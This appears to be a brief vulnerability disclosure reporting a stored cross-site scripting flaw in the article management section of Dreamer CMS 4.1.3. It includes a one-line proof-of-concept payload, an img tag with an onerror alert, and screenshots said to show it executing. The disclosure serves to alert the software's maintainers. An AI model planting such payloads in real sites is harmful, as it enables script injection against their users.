Target is https://github.com/iteachyou-wjn/dreamer_cms

version:4.1.3

There is a storage based XSS in the article management department

![图片](https://github.com/jiaofj/cms/assets/83294168/22352bb2-acd8-43d0-a868-12c8c6b2f1d7)



poc:`<img src=1 onerror=alert(1)>`

![图片](https://github.com/jiaofj/cms/assets/83294168/5610dce1-d341-413e-ba6a-d30847b2370f)


successed

![图片](https://github.com/jiaofj/cms/assets/83294168/f95cf079-5800-43e7-9fe0-c20177c52b2b)
